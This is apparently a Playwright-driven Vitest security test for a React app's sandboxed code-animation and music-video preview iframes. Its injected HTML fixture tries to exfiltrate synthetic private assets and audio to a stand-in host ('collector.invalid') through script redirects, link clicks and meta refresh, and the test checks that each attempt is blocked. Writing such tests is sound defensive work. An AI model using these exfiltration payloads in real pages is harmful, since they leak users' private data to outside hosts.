// @vitest-environment node
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { existsSync } from 'node:fs';
import { fileURLToPath } from 'node:url';
import { join } from 'node:path';
import { chromium } from 'playwright-core';
import { createServer } from 'vite';
import react from '@vitejs/plugin-react';
import { BROWSER_FIXTURE_STARTUP_MS, startBrowserFixture } from '../../test/browserFixture.js';

const chrome = [process.env.CHROME_PATH, chromium.executablePath(), '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome', '/usr/bin/google-chrome', '/usr/bin/chromium'].find(p => p && existsSync(p));
const collector = 'https://collector.invalid/';

describe.skipIf(!chrome)('generated preview navigation boundary in Chrome', () => {
  let fixture;
  beforeAll(async () => {
    fixture = await startBrowserFixture({ name: 'generated-preview', createServer, chromium,
      launchOptions: { executablePath: chrome }, viteConfig: temp => ({
        root: fileURLToPath(new URL('../../..', import.meta.url)), configFile: false, cacheDir: join(temp, 'vite'),
        optimizeDeps: { entries: ['src/components/codeAnimation/CodeAnimationPreview.jsx', 'src/components/musicVideo/CompositionPreviewPlayer.jsx'], include: ['react', 'react-dom/client', 'react-router', 'lucide-react'] },
        plugins: [react(), {
          name: 'generated-preview-fixture',
          resolveId(id) { if (id === '/fixture.jsx') return '\0fixture.jsx'; },
          load(id) {
            if (id.endsWith('/services/apiMusicVideo.js')) return `export async function getMusicVideoCompositionPreview() { return { html: window.fixtureHtml, assets: [{key:'private',url:'/synthetic'}],durationSec:5 }; } export const getMusicVideoLyricPlaythroughPreview=getMusicVideoCompositionPreview; export async function fetchMusicVideoPreviewAsset() { window.fetches++; return new Blob(['SYNTHETIC_PRIVATE_ASSET']); }`;
            if (id.endsWith('/services/api.js')) return 'export const cancelCodeAnimationExport = () => {}; export const exportCodeAnimation = () => {}; export const getCodeAnimationPackage = () => {}; export const getCodeAnimationThreeVendor = () => {}; export const uploadGalleryVideo = () => {};';
            if (id.endsWith('/hooks/useSseProgress.js')) return 'export const useSseProgress = () => ({latest:null});';
            if (id !== '\0fixture.jsx') return;
            return `import React from 'react';import{createRoot}from'react-dom/client';import{MemoryRouter}from'react-router';import Code from '/src/components/codeAnimation/CodeAnimationPreview.jsx';import Music from '/src/components/musicVideo/CompositionPreviewPlayer.jsx';
              const root=createRoot(document.getElementById('root'));window.fetches=0;
              window.mount=(mode,html)=>{window.fixtureHtml=html;root.render(React.createElement(MemoryRouter,null, mode==='music'?React.createElement(Music,{key:html,project:{id:'synthetic',composition:{document:{directory:'synthetic'}}}}):React.createElement(Code,{key:html,html,audioUrl:'data:audio/wav;base64,U1lOVEhFVElDX0FVRElP',audioGlobal:'AUDIO',messages:{ready:'ca:ready',record:'ca:record',recorded:'ca:recorded',progress:'ca:progress',error:'ca:error'},frame:{durationSeconds:1}})));};`;
          },
          configureServer(vite) { vite.middlewares.use('/preview-test', async (_req,res) => { res.setHeader('Content-Type','text/html');res.end(await vite.transformIndexHtml('/preview-test','<div id="root"></div><script type="module" src="/fixture.jsx"></script>')); }); },
        }], server: { host: '127.0.0.1', port: 0 },
      }),
    });
  }, BROWSER_FIXTURE_STARTUP_MS);
  afterAll(() => fixture?.close());

  it.each(['script', 'link', 'refresh'])('blocks %s navigation with bridged media and selected audio', async method => {
    const page = await fixture.browser.newPage();
    page.setDefaultTimeout(5000);
    page.on('pageerror', e => console.error(e.message));
    const requests = [];
    await page.route(`${collector}**`, route => { requests.push(route.request().url()); return route.fulfill({ body:'collector' }); });
    try {
      await page.goto(`${fixture.origin}preview-test`);
      await page.waitForFunction(() => !!window.mount);
      await page.evaluate(() => { window.received = []; window.addEventListener('message', e => { if(e.data?.type === 'test:received') window.received.push(e.data); }); });
      for (const mode of ['music', 'code']) {
        const attack = method === 'script' ? 'location.href=url' : method === 'link' ? "const a=document.createElement('a');a.href=url;document.body.append(a);a.click()" : "const m=document.createElement('meta');m.httpEquiv='refresh';m.content='0;url='+url;document.head.append(m)";
        const html = `<html><head></head><body><script>const attack=secret=>{let opaque=false;try{parent.document.body}catch{opaque=true}top.postMessage({type:'test:received',secret,opaque},'*');const url='${collector}?secret='+encodeURIComponent(secret);${attack};};addEventListener('message',async e=>{if(e.data.type==='portos-mv:manifest')parent.postMessage({type:'portos-mv:request',key:e.data.keys[0]},'*');if(e.data.type==='portos-mv:asset') {document.body.dataset.received=await e.data.blob.text();attack(document.body.dataset.received);}if(e.data.type==='ca:record')parent.postMessage({type:'ca:recorded',blob:new Blob(['synthetic recording'],{type:'video/webm'})},'*');});parent.postMessage({type:'${mode==='music'?'portos-mv:loaded':'ca:ready'}'},'*');if(window.AUDIO){document.body.dataset.received=window.AUDIO;attack(window.AUDIO);}</script></body></html>`;
        await page.evaluate(({mode,html}) => window.mount(mode,html), {mode,html});
        if(mode==='code') await page.getByRole('button',{name:'Run with audio'}).click();
        await page.waitForFunction(count => window.received.length === count, mode === 'music' ? 1 : 2);
        const received = await page.evaluate(() => window.received.at(-1));
        expect(received.secret).toContain(mode === 'music' ? 'SYNTHETIC_PRIVATE_ASSET' : 'data:audio/');
        expect(received.opaque).toBe(true);
        // Blocked navigation may replace the inner document with a browser error page.
        await page.waitForTimeout(100);
        expect(requests).toEqual([]);
        if (mode === 'music') expect(await page.evaluate(() => window.fetches)).toBe(1);
      }
    } finally { await page.close(); }
  }, 30000);
  it('relays module readiness and recording Blobs through the actual animation component', async () => {
    const page = await fixture.browser.newPage();
    page.setDefaultTimeout(5000);
    try {
      await page.goto(`${fixture.origin}preview-test`);
      await page.waitForFunction(() => !!window.mount);
      const html = `<body><script type="module">const value=42;document.body.textContent=String(value);parent.postMessage({type:'ca:ready'},'*');addEventListener('message',e=>{if(e.data.type==='ca:record')parent.postMessage({type:'ca:recorded',blob:new Blob(['synthetic recording'],{type:'video/webm'})},'*')});</script></body>`;
      await page.evaluate(html => window.mount('code', html), html);
      await page.getByRole('button', { name: 'Preview without audio' }).click();
      await page.getByText('Animation ready', { exact: true }).waitFor();
      expect(await page.frameLocator('iframe').frameLocator('iframe').locator('body').innerText()).toBe('42');
      await page.getByRole('button', { name: 'Record (real-time)' }).click();
      await page.getByLabel('Recorded animation').waitFor();
      const download = page.waitForEvent('download');
      await page.getByRole('button', { name: 'Download WebM' }).click();
      expect((await download).suggestedFilename()).toBe('code-animation.webm');
    } finally { await page.close(); }
  }, 30000);

});
